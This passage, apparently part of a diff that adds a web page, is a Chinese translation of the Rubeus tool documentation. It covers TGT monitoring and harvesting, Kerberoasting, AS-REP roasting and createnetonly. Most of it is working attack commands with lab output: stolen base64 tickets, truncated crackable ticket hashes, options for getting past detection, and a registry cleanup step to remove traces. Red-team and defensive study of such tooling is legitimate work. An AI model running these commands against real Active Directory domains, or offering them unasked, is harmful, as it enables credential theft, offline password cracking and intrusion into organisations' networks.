+<p><code>/nowrap</code> 标志将会导致 base64 编码的票据输出，每行都不换行（一行）。</p>
+<p>此外，如果宁希望将输出保存到注册表，可以添加 /registry 标志，并在 HKLM 下指定一个路径来创建（例如：<code>/registry:SOFTWARE\MONITOR</code>）。然后，宁可以在运行完 Rubeus 后通过 <code>Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force</code> 删除这个条目。</p>
+<pre><code>c:\Rubeus&gt;Rubeus.exe monitor /targetuser:DC$ /interval:10
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Monitoring
+[*] Target user     : DC$
+[*] Monitoring every 10 seconds for new TGTs
+
+
+[*] 12/21/2019 11:10:16 PM UTC - Found new TGT:
+
+  User                  :  DC$@THESHIRE.LOCAL
+  StartTime             :  12/21/2019 2:44:31 PM
+  EndTime               :  12/21/2019 3:44:31 PM
+  RenewTill             :  12/28/2019 2:13:06 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFFDCCBRCgAwIBBaEDAgEWoo...(snip)...
+
+[*] Ticket cache size: 1</code></pre>
+<p><strong>该操作需要在一个高权限的上下文中执行</strong></p>
+<h3 id="harvest"><a href="#harvest" class="headerlink" title="harvest"></a>harvest</h3><p><strong>harvest</strong> 函数 将  <a href="#monitor">monitor</a> 又向前推进了异步。它每隔 /monitorinterval:X 秒（默认 60 秒）定期提取所有的 TGT，提取任何新的 TGT KRB-CRED 文件，并保存所有提取的 TGT 的缓存。每隔一段事件，任何将在下一个时间间隔之前过期的 TGT 都会被自动续订（直到他们的续订极限）。每隔 <code>/displayinterval:X</code> 秒（默认为 1200）和当前缓存的 “可用”/有效 的 TGT KRB-CRED .kribi 会被输出为 base64 blob。</p>
+<p>这允许宁从系统中获取可用的 TGT，而不需要打开 LSASS 的读取句柄，进行提取票据需要提升权限。</p>
+<p><code>/nowrap</code> 标志将会使 base64 编码的票据输出，每行都不换行（一行输出）。</p>
+<p>此外，如果宁希望将输出保存到注册表，可以添加 /registry 标志，并在 HKLM 下指定一个路径来创建（例如：<code>/registry:SOFTWARE\MONITOR</code>）。然后，宁可以在运行完 Rubeus 后通过 <code>Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force</code> 删除这个条目。</p>
+<pre><code>c:\Rubeus&gt;Rubeus.exe harvest /interval:30
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v0.0.1a
+
+[*] Action: TGT Harvesting (w/ auto-renewal)
+
+[*] Monitoring every 30 minutes for 4624 logon events
+
+...(snip)...
+
+[*] Renewing TGT for dfm.a@TESTLAB.LOCAL
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1520 bytes
+[*] Received 1549 bytes
+
+[*] 9/17/2018 6:43:02 AM - Current usable TGTs:
+
+User                  :  dfm.a@TESTLAB.LOCAL
+StartTime             :  9/17/2018 6:43:02 AM
+EndTime               :  9/17/2018 11:43:02 AM
+RenewTill             :  9/24/2018 2:07:48 AM
+Flags                 :  name_canonicalize, renewable, forwarded, forwardable
+Base64EncodedTicket   :
+
+    doIFujCCBbagAw...(snip)...</code></pre>
+<p><strong>该操作需要在一个高权限的上下文中执行</strong></p>
+<h2 id="烘烤"><a href="#烘烤" class="headerlink" title="烘烤"></a>烘烤</h2><p>Roasting 命令的类别：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="#kerberoast">kerberoast</a></td>
+<td>为所有（或指定的用户）执行 kerberoasting</td>
+</tr>
+<tr>
+<td><a href="#asreproast">asreproast</a></td>
+<td>为所有（或指定的用户）执行 AS-REP roasting</td>
+</tr>
+</tbody></table>
+<h3 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h3><p><strong>kerberoast</strong> 函数 取代了 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpRoast">SharpRoast</a> 项目的功能。和 SharpRoast 一样，这个动作也使用了 <a target="_blank" rel="noopener" href="https://twitter.com/machosec">@machosec</a> 贡献给 PowerView 的 <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx">KerberosRequestorSecurityToken.GetRequest Method()</a> 方法来请求适当的服务票据（关于默认行为，请参见 <a href="#kerberoasting-opsec">opsec table</a> 了解更多细节）。与 SharpRoast 不同的是，这个操作现在会对结果结构进行适当的 ASN.1 解析。</p>
+<p>在没有其他参数的情况下，所有当前域内 设置了 SPN 的用户账户都会被 “烘烤”，请求他们支持的最高加密类型（参见 <a href="#kerberoasting-opsec">opsec table</a>）。<code>/spn:X</code> 参数只对指定的 SPN 进行 “烘烤”，<code>/user:X</code> 参数只对指定的用户进行 “烘烤”，<code>/ou:X</code> 参数只对特定 OU 中的用户进行 “烘烤”。<code>/domain</code> 和 <code>/dc</code> 参数是可选的，与其他操作一样，采用系统默认值。</p>
+<p><code>/stats</code> 标志将输出关于 找到的 可执行 kerberoasting 用户的 统计数据，包括支持的加密类型和用户密码最后设置的年份。这个标志可以和其他目标选项结合起来。</p>
+<p><code>/outfile:FILE</code> 参数会输出 “烘烤后” 的 hash 值到指定的文件，每行一个。</p>
+<p>如果指定了 <code>/simple</code> 标志，则 “烘烤后” 的 hash 值将输出到控制台，每行一个。</p>
+<p>如果指定了 <code>/nowrap</code> 标志，则 kerberoast 的结果不会换行。</p>
+<p>如果提供的 TGT <code>/ticket:X</code>（base64 编码的 .kirbi 文件或磁盘上 .kirbi 文件的路径），该 TGT 在 “烘烤” 过程中用于请求服务票据。如果 <code>/ticket:X</code> 与 <code>/spn:Y</code> 一起使用，那么就不会发生用户的 LDAP 搜索，因此可以在 未加入域环境的系统中 与 <code>/dc:Z</code> 一起使用。</p>
+<p>如果提供了 <code>/tgtdeleg</code> 标志，那么 <a href="#tgtdeleg">tgtdeleg</a> 技巧将用来获取当前用户的可用 TGT，然后用于 “烘烤” 请求。如果使用这个标志， 在 <strong>msDS-SupportedEncryptionTypes</strong> 中启用 AES 的账户将被请求 RC4 票据。</p>
+<p>如果提供了 <code>/aes</code> 标志，则在 <strong>msDS-SupportedEncryptionTypes</strong> 中启用 AES 加密的账户将被枚举，并请求 AES 服务票据。</p>
+<p>如果提供了 <code>/ldapfilter:X</code> 参数，则所提供的 LDAP 过滤器 将被添加到 用于查找 kerberoastable 用户的 最终 LDAP 查询中。</p>
+<p>如果指定了 <code>/rc4opsec</code> 标志，则会使用 <strong>tgtdeleg</strong> 技巧，并对未启用 AES 的账户进行枚举和 “烘烤”。</p>
+<p>如果宁想在 kerberoasting 中使用备用域凭证（以及搜索进行 “烘烤” 的用户），可以使用 <code>/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD</code> 来指定。</p>
+<p>如果提供了 <code>/pwdsetafter:MM-dd-yyyy</code> 参数，则只有密码在 MM-dd-yyyy 之后修改的才会被枚举和 “烘烤”。</p>
+<p>如果提供了 <code>/pwdsetbefore:MM-dd-yyyy</code> 参数，则只有密码在 MM-dd-yyyy 之前修改的才会被枚举和 “烘烤”。</p>
+<p>如果提供了 <code>/resultlimit:NUMBER</code> 参数，那么将限制枚举和 “烘烤” 账户的数量。</p>
+<h4 id="kerberoasting-opsec"><a href="#kerberoasting-opsec" class="headerlink" title="kerberoasting opsec"></a>kerberoasting opsec</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>none</strong></td>
+<td>使用 KerberosRequestorSecurityToken 烘烤 方式， 以支持的最高加密方式进行 “烘烤”</td>
+</tr>
+<tr>
+<td><strong>/tgtdeleg</strong></td>
+<td>使用 <strong>tgtdeleg</strong> 技巧 为启用 RC4 的账户 执行 TGS-REQ 请求，“烘烤”所有指定了 RC4 的用户</td>
+</tr>
+<tr>
+<td><strong>/ticket:X</strong></td>
+<td>使用指定的 TGT blob/文件发起 TGS-REQ 请求，“烘烤”所有指定了 RC4 的用户</td>
+</tr>
+<tr>
+<td><strong>/rc4opsec</strong></td>
+<td>使用 <strong>tgtdeleg</strong> 技巧，枚举没有启用 AES 的账户， 指定以 RC4 进行 “烘烤”</td>
+</tr>
+<tr>
+<td><strong>/aes</strong></td>
+<td>枚举启用了 AES 的账户， 使用 KerberosRequestorSecurityToken 烘烤 方式,，以支持的最高加密方式进行 “烘烤”</td>
+</tr>
+<tr>
+<td><strong>/aes /tgtdeleg</strong></td>
+<td>使用 <strong>tgtdeleg</strong> 技巧，枚举启用了 AES 的账户，指定以 AES 进行 “烘烤”</td>
+</tr>
+<tr>
+<td><strong>/pwdsetafter:X</strong></td>
+<td>使用提供的日期， 并且只枚举 “在该日期之后修改密码” 的账户（密码最后修改时间 &gt; 指定日期）</td>
+</tr>
+<tr>
+<td><strong>/pwdsetbefore:X</strong></td>
+<td>使用提供的日期， 并且只枚举 “在该日期之前修改密码” 的账户（密码最后修改时间 &lt; 指定日期）</td>
+</tr>
+<tr>
+<td><strong>/resultlimit:X</strong></td>
+<td>使用指定的数字限制将被 “烘烤” 的帐户</td>
+</tr>
+</tbody></table>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>使用默认的 <code>KerberosRequestorSecurityToken.GetRequest</code> 方法 Kerberoasting 当前域中的所有用户：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe kerberoast
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+[*] Action: Kerberoasting
+
+
+[*] SamAccountName         : harmj0y
+[*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+[*] ServicePrincipalName   : asdf/asdfasdf
+[*] Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$AE5F019D4CDED6CD74830CC...(snip)...
+
+
+[*] SamAccountName         : sqlservice
+[*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
+[*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
+[*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$E2B3869290...(snip)...
+
+...(snip)...</code></pre>
+<p>Kerberoasting 一个指定 OU 中的所有用户，保存为 hash，输出到文件中：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local /outfile:C:\Temp\hashes.txt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+[*] Action: Kerberoasting
+
+[*] Target OU              : OU=TestingOU,DC=testlab,DC=local
+
+[*] SamAccountName         : testuser2
+[*] DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
+[*] ServicePrincipalName   : service/host
+[*] Hash written to C:\Temp\hashes.txt
+
+[*] Roasted hashes written to : C:\Temp\hashes.txt</code></pre>
+<p>使用 <code>tgtdeleg</code> 技巧 执行 Kerberoasting ，获得一个可用的 TGT，只为最后一次修改密码是在 01-31-2005 至 03-29-2010 之间的账户请求票据，最多返回 3 张服务票据：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe kerberoast /tgtdeleg /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:3
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: Kerberoasting
+
+[*] Using &#39;tgtdeleg&#39; to request a TGT for the current user
+[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
+[*] Searching the current domain for Kerberoastable users
+[*] Searching for accounts with lastpwdset from 01-31-2005 to 03-29-2010
+[*] Up to 3 result(s) will be returned
+
+[*] Total kerberoastable users : 3
+
+
+[*] SamAccountName         : harmj0y
+[*] DistinguishedName      : CN=harmj0y,OU=TestOU,DC=theshire,DC=local
+[*] ServicePrincipalName   : testspn/server
+[*] PwdLastSet             : 5/31/2008 12:00:02 AM
+[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
+[*] Hash                   : $krb5tgs$23$*harmj0y$theshire.local$testspn/server*$F6EEFE5026CF8F02E3DC...(snip)...
+
+
+[*] SamAccountName         : constraineduser
+[*] DistinguishedName      : CN=constraineduser,CN=Users,DC=theshire,DC=local
+[*] ServicePrincipalName   : blah/blah123
+[*] PwdLastSet             : 9/5/2009 7:48:50 PM
+[*] Supported ETypes       : RC4_HMAC
+[*] Hash                   : $krb5tgs$23$*constraineduser$theshire.local$blah/blah123*$6F0992C377AA12...(snip)...
+
+
+[*] SamAccountName         : newuser
+[*] DistinguishedName      : CN=newuser,CN=Users,DC=theshire,DC=local
+[*] ServicePrincipalName   : blah/blah123456
+[*] PwdLastSet             : 9/12/2008 8:05:16 PM
+[*] Supported ETypes       : RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
+[*] Hash                   : $krb5tgs$23$*newuser$theshire.local$blah/blah123456*$C4561559C2A7DF07712...(snip)...</code></pre>
+<p>列出关于 “找到的 可执行 kerberoasting 账户的” 统计信息，而无需实际发送票据请求：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe kerberoast /stats
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: Kerberoasting
+
+[*] Listing statistics about target users, no ticket requests being performed.
+[*] Searching the current domain for Kerberoastable users
+
+[*] Total kerberoastable users : 4
+
+
+ ----------------------------------------------------------------------
+ | Supported Encryption Type                                  | Count |
+ ----------------------------------------------------------------------
+ | RC4_HMAC_DEFAULT                                           | 1     |
+ | RC4_HMAC                                                   | 1     |
+ | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96           | 1     |
+ | RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 1     |
+ ----------------------------------------------------------------------
+
+ ----------------------------------
+ | Password Last Set Year | Count |
+ ----------------------------------
+ | 2019                   | 4     |
+ ----------------------------------</code></pre>
+<p>为一个特定的用户执行 Kerberoasting，并输出简化的 hash：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe kerberoast /user:harmj0y /simple
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : harmj0y
+[*] Searching the current domain for Kerberoastable users
+
+[*] Total kerberoastable users : 1
+
+$krb5tgs$18$*harmj0y$theshire.local$testspn/server*$F63783C58AA153F24DFCC796A120C55C$06C6929374A2D3...(snip)...</code></pre>
+<p>在外部信任域中为所有用户执行 Kerberoasting，在输出结果中不换行：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe kerberoast /domain:dev.testlab.local /nowrap
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.5.0
+
+
+[*] Action: Kerberoasting
+
+[*] Target Domain          : dev.testlab.local
+
+[*] SamAccountName         : jason
+[*] DistinguishedName      : CN=jason,CN=Users,DC=dev,DC=testlab,DC=local
+[*] ServicePrincipalName   : test/test
+[*] Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test@dev.testlab.local*$969339A82...(snip)...</code></pre>
+<p>使用是一个现有的 TGT 执行 Kerberoasting：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe kerberoast /ticket:doIFujCCBbagAwIBBaEDAgEWoo...(snip)... /spn:&quot;asdf/asdfasdf&quot; /dc:primary.testlab.local
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.5
+
+
+[*] Action: Kerberoasting
+
+[*] Using a TGT /ticket to request service tickets
+
+[*] Target SPN             : asdf/asdfasdf
+[*] Hash                   : $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$4EFF99FDED690AB4616EB...(snip)...</code></pre>
+<p>“Opsec” Kerberoasting，使用 <strong>tgtdeleg</strong> 技巧，筛选出没有开启了 AES 的账户：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe kerberoast /rc4opsec
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.6
+
+
+[*] Action: Kerberoasting
+
+[*] Using &#39;tgtdeleg&#39; to request a TGT for the current user
+[*] Searching the current domain for Kerberoastable users
+[*] Searching for accounts that only support RC4_HMAC, no AES
+
+[*] Found 6 users to Kerberoast!
+
+[*] SamAccountName         : harmj0y
+[*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+[*] ServicePrincipalName   : asdf/asdfasdf
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*harmj0y$testlab.local$asdf/asdfasdf*$6B4AD4B61D37D54...(snip)...</code></pre>
+<h3 id="asreproast"><a href="#asreproast" class="headerlink" title="asreproast"></a>asreproast</h3><p><strong>asreproast</strong> 函数 取代了 <a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/ASREPRoast/">ASREPRoast</a> 项目，该项目采用规模更大的 <a target="_blank" rel="noopener" href="https://www.bouncycastle.org/">BouncyCastle</a> 库执行类似的功能。如果域用户没有启用 kerberos 预认证，可以为该用户成功的请求 AS-REQ/AS-REP，并且可以像 kerberoasting 一样离线破解该结构的某个部分。更多信息 <a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">参考</a></p>
+<p>就像使用  <a href="#kerberoast">kerberoast</a> 命令一样，如果没有提供其他参数，所有不需要 kerberos 预认证的用户账户都会 “烤熟”。<code>/user:X</code> 参数可以指定被 “烤” 的用户；<code>/ou:X</code> 参数可以指定被  “烤” 的 OU 中的用户。<code>/domain</code> and <code>/dc</code> 参数是可选的，向其他操作一样获取系统默认值。</p>
+<p><code>/outfile:FILE</code> 参数将被 “烤出” 的 hash 值输出到一个指定的文件中，每行一个。</p>
+<p>另外，如果宁想使用备用域凭证进行 kerberoasting，可以使用 <code>/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD</code> 来指定。</p>
+<p>输出 <code>/format:X</code> 默认为 John the Ripper （<a target="_blank" rel="noopener" href="https://github.com/magnumripper/JohnTheRipper">Jumbo version</a>）。/format:hashcat 也是一个可选的，为 hashcat 格式 18200 。</p>
+<p>AS-REP roasting 当前域内的所有用户：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe asreproast
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : testlab.local
+
+[*] SamAccountName         : dfm.a
+[*] DistinguishedName      : CN=dfm.a,CN=Users,DC=testlab,DC=local
+[*] Using domain controller: testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/o preauth) for: &#39;testlab.local\dfm.a&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 163 bytes
+[*] Received 1537 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+    $krb5asrep$dfm.a@testlab.local:D4A4BC281B200EE35CBF4A4537792D07$D655...(snip)...
+
+[*] SamAccountName         : TestOU3user
+[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+[*] Using domain controller: testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/o preauth) for: &#39;testlab.local\TestOU3user&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 169 bytes
+[*] Received 1437 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+    $krb5asrep$TestOU3user@testlab.local:DD6DF16B7E65223679CD703837C94FB...(snip)..
+
+[*] SamAccountName         : harmj0y2
+[*] DistinguishedName      : CN=harmj0y2,CN=Users,DC=testlab,DC=local
+[*] Using domain controller: testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/o preauth) for: &#39;testlab.local\harmj0y2&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 166 bytes
+[*] Received 1407 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+    $krb5asrep$harmj0y2@testlab.local:7D2E379A076BB804AF275ED51B86BF85$8...(snip)..</code></pre>
+<p>AS-REP roasting 指定 OU 中所有用户，保存为 hashcat 格式，输出到一个文件中：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe asreproast /ou:OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local /format:hashcat /outfile:C:\Temp\hashes.txt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+[*] Action: AS-REP roasting
+
+[*] Target OU              : OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+[*] Target Domain          : testlab.local
+
+[*] SamAccountName         : TestOU3user
+[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+[*] Using domain controller: testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/o preauth) for: &#39;testlab.local\TestOU3user&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 169 bytes
+[*] Received 1437 bytes
+[+] AS-REQ w/o preauth successful!
+[*] Hash written to C:\Temp\hashes.txt
+
+[*] Roasted hashes written to : C:\Temp\hashes.txt</code></pre>
+<p>AS-REP roasting 一个指定的用户：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe asreproast /user:TestOU3user
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : TestOU3user
+[*] Target Domain          : testlab.local
+
+[*] SamAccountName         : TestOU3user
+[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+[*] Using domain controller: testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/o preauth) for: &#39;testlab.local\TestOU3user&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 169 bytes
+[*] Received 1437 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+    $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...</code></pre>
+<p>AS-REP roasting 一个外部信任域中的所有用户：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe asreproast /domain:dev.testlab.local
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : dev.testlab.local
+
+[*] SamAccountName         : devuser3
+[*] DistinguishedName      : CN=devuser3,CN=Users,DC=dev,DC=testlab,DC=local
+[*] Using domain controller: dev.testlab.local (192.168.52.105)
+[*] Building AS-REQ (w/o preauth) for: &#39;dev.testlab.local\devuser3&#39;
+[*] Connecting to 192.168.52.105:88
+[*] Sent 175 bytes
+[*] Received 1448 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+    $krb5asrep$devuser3@dev.testlab.local:650B881E44B92FB6A378DD21E8B020...(snip)...</code></pre>
+<p>使用备用凭证在外部非信任域中 AS-REP roasting 用户：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe asreproast /domain:external.local /creduser:&quot;EXTERNAL.local\administrator&quot; /credpassword:&quot;Password123!&quot;
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : external.local
+
+[*] Using alternate creds  : EXTERNAL.local\administrator
+
+[*] SamAccountName         : david
+[*] DistinguishedName      : CN=david,CN=Users,DC=external,DC=local
+[*] Using domain controller: external.local (192.168.52.95)
+[*] Building AS-REQ (w/o preauth) for: &#39;external.local\david&#39;
+[*] Connecting to 192.168.52.95:88
+[*] Sent 165 bytes
+[*] Received 1376 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+    $krb5asrep$david@external.local:9F5A33465C53056F17FEFDF09B7D36DD$47DBAC3...(snip)...</code></pre>
+<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>杂项命令的类别：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="#createnetonly">createnetonly</a></td>
+<td>创建登录类型 9 的过程</td>
+</tr>
+<tr>
+<td><a href="#changepw">changepw</a></td>
+<td>执行 Aorato Kerberos 密码重置</td>
+</tr>
+<tr>
+<td><a href="#hash">hash</a></td>
+<td>将明文密码转换为 Kerberos 加密密钥</td>
+</tr>
+<tr>
+<td><a href="#tgssub">tgssub</a></td>
+<td>替换服务票据中的服务名称</td>
+</tr>
+<tr>
+<td><a href="#currentluid">currentluid</a></td>
+<td>显示当前用户的 LUID</td>
+</tr>
+</tbody></table>
+<h3 id="createnetonly"><a href="#createnetonly" class="headerlink" title="createnetonly"></a>createnetonly</h3><p><strong>createnetonly</strong> 函数 将使用 CreateProcessWithLogonW() API 创建一个新的隐藏进程（除非指定了 <code>/show</code>），其 SECURITY_LOGON_TYPE 为 9（NewCredentials），相当于 runas /netonly。进程 ID 和 LUID （登录会话 ID）将被返回。然后，可以通过 <a href="#ptt">ptt /luid:0xA..</a> 将特定的 kerberos 票据应用于该进程，假设已经提权。这样可以防止清除当前登录会话的现有 TGT。</p>
+<p>创建一个隐藏进程 upnpcont.exe：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\upnpcont.exe&quot;
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Create Process (/netonly)
+
+[*] Showing process : False
+[+] Process         : &#39;C:\Windows\System32\upnpcont.exe&#39; successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 9936
+[+] LUID            : 0x4a0717f</code></pre>
+<p>创建一个可见的命令提示符：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\cmd.exe&quot; /show
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Create Process (/netonly)
+
+[*] Showing process : True
+[+] Process         : &#39;C:\Windows\System32\cmd.exe&#39; successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 5352
+[+] LUID            : 0x4a091c0</code></pre>
